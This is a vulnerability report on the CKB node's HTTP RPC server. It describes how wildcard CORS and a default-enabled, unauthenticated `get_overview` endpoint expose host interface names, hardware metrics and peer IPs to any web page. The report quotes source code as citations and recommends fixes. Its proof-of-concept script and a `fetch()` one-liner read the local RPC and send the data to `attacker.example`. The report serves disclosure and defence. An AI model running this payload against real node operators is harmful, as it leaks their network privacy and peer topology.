### Title
Unauthenticated `get_overview` RPC Exposes Host System Internals and Full Peer Topology to Any Web Origin via Permissive CORS — (`File: rpc/src/server.rs`, `rpc/src/module/terminal.rs`)

---

### Summary

The CKB RPC HTTP server applies `CorsLayer::permissive()` globally, setting `Access-Control-Allow-Origin: *` on every response. The Terminal module's `get_overview` endpoint — enabled by default in production — returns host-level system data (all network interface names and traffic counters, disk sizes, RAM, CPU) and the full connected-peer list (IP addresses, latency, inbound/outbound direction) with no authentication check. Any web page visited by the node operator can silently POST a JSON-RPC call to `http://127.0.0.1:8114/` and read the full response, bypassing the operator's expectation that the RPC port is localhost-only.

---

### Finding Description

**Root cause 1 — Permissive CORS on the HTTP RPC server**

`rpc/src/server.rs` line 124 applies `CorsLayer::permissive()` to the Axum router that serves all HTTP and WebSocket RPC traffic:

```rust
let app = Router::new()
    .route("/", method_router.clone())
    .route("/{*path}", method_router)
    .route("/ping", get(ping_handler))
    .layer(Extension(Arc::clone(rpc)))
    .layer(CorsLayer::permissive())   // ← allows any origin to read responses
    ...
```

`CorsLayer::permissive()` emits `Access-Control-Allow-Origin: *`, `Access-Control-Allow-Methods: *`, and `Access-Control-Allow-Headers: *`. A browser therefore allows JavaScript on any third-party page to read the full JSON body of a cross-origin POST to `http://127.0.0.1:8114/`. [1](#0-0) 

**Root cause 2 — `get_overview` exposes sensitive host and network data with no authentication**

`rpc/src/module/terminal.rs` implements `get_overview`, which collects and returns in a single unauthenticated call:

- **All host network interfaces** by name (`eth0`, `tun0`, `docker0`, etc.) with per-interface byte counters — revealing VPN, Tor, and container network topology of the host machine.
- **All disk devices** with total/available space and removable flag — revealing server hardware layout.
- **Full RAM and CPU metrics** of the host.
- **Every connected P2P peer**: IP address, port, peer-ID, inbound/outbound direction, and RTT latency.

```rust
let sys_networks = SysNetworks::new_with_refreshed_list();
let networks = sys_networks
    .iter()
    .map(|(name, data)| Network {
        interface_name: name.clone(),   // ← host NIC names
        received: data.received(),
        ...
    })
    .collect();
```

```rust
peer_infos.push(PeerInfo {
    peer_id,
    is_outbound,
    latency_ms: latency_ms.into(),
    address: peer.connected_addr.to_string(),  // ← full IP:port of every peer
});
``` [2](#0-1) [3](#0-2) 

**Root cause 3 — Terminal module enabled by default in production**

`resource/ckb.toml` line 190 lists `"Terminal"` in the default `modules` array, so `get_overview` is active on every standard node deployment without any operator opt-in:

```toml
modules = ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Terminal"]
``` [4](#0-3) 

There is no authentication layer anywhere in the RPC stack — no token, no session, no IP allowlist enforced in code. The only protection is the default `listen_address = "127.0.0.1:8114"`, which the permissive CORS policy defeats for browser-based attackers. [5](#0-4) 

---

### Impact Explanation

A node operator who visits any malicious (or compromised) web page while running a CKB node exposes:

1. **Host network interface names** — reveals whether the operator uses a VPN (`tun0`), Tor (`tor0`), Docker (`docker0`), or other sensitive network configurations, defeating privacy measures the operator may have taken.
2. **Full connected-peer IP list** — an attacker learns every peer the node is currently connected to, enabling targeted eclipse attacks, peer-level DDoS, or deanonymization of the node's network position.
3. **Disk and memory layout** — minor hardware fingerprinting useful for follow-on targeting.

The `local_node_info` and `get_peers` endpoints in the Net module are subject to the same CORS bypass and expose the node's own P2P addresses and all peer details. [6](#0-5) [7](#0-6) 

---

### Likelihood Explanation

The attack requires only that the node operator opens a browser on the same machine as the node (the common case for home/hobbyist operators and developers). No special privileges, no leaked keys, no network access beyond a normal web page. The default configuration (`127.0.0.1:8114`, Terminal module enabled, `CorsLayer::permissive()`) makes every default CKB node installation vulnerable. The attacker payload is a single `fetch()` call:

```javascript
fetch("http://127.0.0.1:8114/", {
  method: "POST",
  headers: {"Content-Type": "application/json"},
  body: JSON.stringify({jsonrpc:"2.0", method:"get_overview", params:[null], id:1})
}).then(r => r.json()).then(data => exfiltrate(data));
```

Because `CorsLayer::permissive()` returns `Access-Control-Allow-Origin: *`, the browser allows the script to read the full response body. [8](#0-7) 

---

### Recommendation

1. **Replace `CorsLayer::permissive()` with a restrictive policy.** For a localhost-only RPC, the correct policy is to allow only `null` origin (direct requests) or an explicit allowlist. Wildcard CORS on a localhost service defeats the same-origin protection browsers provide.
2. **Add optional token-based authentication** to the RPC server (similar to the miner client's HTTP Basic Auth already present in `miner/src/client.rs`) so that even if CORS is misconfigured, unauthenticated callers are rejected.
3. **Restrict `get_overview` system-info fields.** Network interface names and disk device details are host-level data that have no blockchain purpose; they should be omitted or gated behind a separate, explicitly opt-in endpoint. [9](#0-8) 

---

### Proof of Concept

**Preconditions:** Default CKB node running (`ckb run`), operator opens a browser on the same host.

**Attacker page (any origin):**

```html
<script>
fetch("http://127.0.0.1:8114/", {
  method: "POST",
  headers: {"Content-Type": "application/json"},
  body: JSON.stringify({
    jsonrpc: "2.0",
    method: "get_overview",
    params: [null],
    id: 1
  })
})
.then(r => r.json())
.then(overview => {
  // overview.sys.global.networks → all host NIC names + traffic
  // overview.network.peers       → all peer IPs, ports, latency
  console.log("NICs:", overview.sys.global.networks.map(n => n.interface_name));
  console.log("Peers:", overview.network.peers.map(p => p.address));
  // exfiltrate to attacker server
  fetch("https://attacker.example/collect", {method:"POST",
    body: JSON.stringify(overview)});
});
</script>
```

**Expected result:** The browser reads the full `Overview` JSON (permitted by `Access-Control-Allow-Origin: *`) and the attacker receives the node's host network interface names, all connected peer IP addresses, disk layout, and memory/CPU metrics — all without any credential or user interaction beyond the page load. [10](#0-9) [1](#0-0)

### Citations

**File:** rpc/src/server.rs (L97-130)
```rust
    fn start_server(
        rpc: &Arc<MetaIoHandler<Option<Session>>>,
        address: String,
        handler: Handle,
        enable_websocket: bool,
    ) -> Result<SocketAddr, AnyError> {
        let stream_config = StreamServerConfig::default()
            .with_keep_alive(true)
            .with_pipeline_size(4)
            .with_shutdown(async move {
                new_tokio_exit_rx().cancelled().await;
            });

        // HTTP and WS server.
        let post_router = post(handle_jsonrpc::<Option<Session>>);
        let get_router = if enable_websocket {
            get(handle_jsonrpc_ws::<Option<Session>>)
        } else {
            get(get_error_handler)
        };
        let method_router = post_router.merge(get_router);

        let app = Router::new()
            .route("/", method_router.clone())
            .route("/{*path}", method_router)
            .route("/ping", get(ping_handler))
            .layer(Extension(Arc::clone(rpc)))
            .layer(CorsLayer::permissive())
            .layer(TimeoutLayer::with_status_code(
                StatusCode::REQUEST_TIMEOUT,
                Duration::from_secs(30),
            ))
            .layer(Extension(stream_config));

```

**File:** rpc/src/module/terminal.rs (L438-464)
```rust
#[async_trait]
impl TerminalRpc for TerminalRpcImpl {
    fn get_overview(&self, refresh: Option<u32>) -> Result<Overview> {
        let refresh = refresh
            .and_then(RefreshKind::from_bits)
            .unwrap_or(RefreshKind::NOTHING);

        // If refresh everything, clear cache first
        if refresh.contains(RefreshKind::EVERYTHING) {
            self.cache.clear_all();
        }

        let sys = self.get_sys_info(refresh)?;
        let mining = self.get_mining_info(refresh)?;
        let pool = self.get_tx_pool_info(refresh)?;
        let cells = self.get_cells_info(refresh)?;
        let network = self.get_network_info(refresh)?;

        Ok(Overview {
            sys,
            cells,
            mining,
            pool,
            network,
            version: self.network_controller.version().to_owned(),
        })
    }
```

**File:** rpc/src/module/terminal.rs (L500-570)
```rust
    fn get_sys_info(&self, refresh: RefreshKind) -> Result<SysInfo> {
        // Check cache first unless force refresh
        if !refresh.contains(RefreshKind::SYSTEM_INFO)
            && let Some(cached) = self.cache.get_sys_info()
        {
            return Ok(cached);
        }

        // Fetch fresh system data
        let mut sys = System::new_all();
        sys.refresh_all();

        let total_memory = sys.total_memory();
        let used_memory = sys.used_memory();
        let global_cpu_usage = sys.global_cpu_usage();
        let sys_disks = SysDisks::new_with_refreshed_list();
        let disks = sys_disks
            .iter()
            .map(|disk| Disk {
                total_space: disk.total_space(),
                available_space: disk.available_space(),
                is_removable: disk.is_removable(),
            })
            .collect();
        let sys_networks = SysNetworks::new_with_refreshed_list();
        let networks = sys_networks
            .iter()
            .map(|(name, data)| Network {
                interface_name: name.clone(),
                received: data.received(),
                total_received: data.total_received(),
                transmitted: data.transmitted(),
                total_transmitted: data.total_transmitted(),
            })
            .collect();

        let global = Global {
            total_memory,
            used_memory,
            global_cpu_usage,
            disks,
            networks,
        };

        let process = sys
            .process(
                sysinfo::get_current_pid()
                    .map_err(|e| RPCError::custom(RPCError::CKBInternalError, e))?,
            )
            .ok_or_else(|| {
                RPCError::custom(RPCError::CKBInternalError, "failed to get current process")
            })?;

        let sys_disk_usage = process.disk_usage();
        let sys_info = SysInfo {
            global,
            cpu_usage: process.cpu_usage(),
            memory: process.memory(),
            disk_usage: DiskUsage {
                total_written_bytes: sys_disk_usage.total_written_bytes,
                written_bytes: sys_disk_usage.written_bytes,
                total_read_bytes: sys_disk_usage.total_read_bytes,
                read_bytes: sys_disk_usage.read_bytes,
            },
            virtual_memory: process.virtual_memory(),
        };

        // Cache the result
        self.cache.set_sys_info(sys_info.clone());
        Ok(sys_info)
    }
```

**File:** rpc/src/module/terminal.rs (L686-692)
```rust

            peer_infos.push(PeerInfo {
                peer_id,
                is_outbound,
                latency_ms: latency_ms.into(),
                address: peer.connected_addr.to_string(),
            });
```

**File:** resource/ckb.toml (L189-193)
```text
# List of API modules: ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Debug", "Indexer", "RichIndexer", "Terminal"]
modules = ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Terminal"] # {{
# dev => modules = ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Debug", "Terminal"]
# integration => modules = ["Net", "Pool", "Miner", "Chain", "Experiment", "Stats", "IntegrationTest", "Terminal"]
# }}
```

**File:** rpc/src/module/net.rs (L556-582)
```rust
    fn local_node_info(&self) -> Result<LocalNode> {
        Ok(LocalNode {
            version: self.network_controller.version().to_owned(),
            node_id: self.network_controller.node_id(),
            active: self.network_controller.is_active(),
            addresses: self
                .network_controller
                .public_urls(MAX_ADDRS)
                .into_iter()
                .map(|(address, score)| NodeAddress {
                    address,
                    score: u64::from(score).into(),
                })
                .collect(),
            protocols: self
                .network_controller
                .protocols()
                .into_iter()
                .map(|(protocol_id, name, support_versions)| LocalNodeProtocol {
                    id: (protocol_id.value() as u64).into(),
                    name,
                    support_versions,
                })
                .collect::<Vec<_>>(),
            connections: (self.network_controller.connected_peers().len() as u64).into(),
        })
    }
```

**File:** miner/src/client.rs (L380-394)
```rust
fn parse_authorization(url: &Uri) -> Option<HeaderValue> {
    let a: Vec<&str> = url.authority()?.as_str().split('@').collect();
    if a.len() >= 2 {
        if a[0].is_empty() {
            return None;
        }
        let mut encoded = "Basic ".to_string();
        base64::prelude::BASE64_STANDARD.encode_string(a[0], &mut encoded);
        let mut header = HeaderValue::from_str(&encoded).unwrap();
        header.set_sensitive(true);
        Some(header)
    } else {
        None
    }
}
```
